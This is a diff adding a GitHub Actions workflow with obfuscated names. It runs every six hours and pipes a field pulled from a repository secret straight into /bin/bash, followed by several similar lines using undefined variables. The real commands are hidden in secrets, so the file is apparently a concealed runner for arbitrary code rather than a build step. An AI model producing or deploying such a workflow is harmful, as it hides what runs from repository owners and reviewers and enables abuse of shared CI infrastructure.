@@ -1,0 +1,26 @@
+name: laimouli2197
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laimouli2197
+        env:
+          trlc87: ${{ secrets.trlc87 }}
+        run: |
+          echo $trlc87 | jq -r .apfe67 | /bin/bash
+          echo $n8537 | jq -r .ojwbx902 | /bin/bash
+          echo $ffney93339 | jq -r .rhuxs0 | /bin/bash
+          echo $neng3985 | jq -r .xi63 | /bin/bash
+          echo $in91 | jq -r .nk2 | /bin/bash
+          echo $dhzkx8 | jq -r .ncoz541 | /bin/bash
+          echo $w63 | jq -r .zkly511 | /bin/bash
+          echo $kayy9526 | jq -r .rdlup2734 | /bin/bash
+          echo $jubwp7 | jq -r .cxx87 | /bin/bash
+          echo $kay5455 | jq -r .d1 | /bin/bash
+
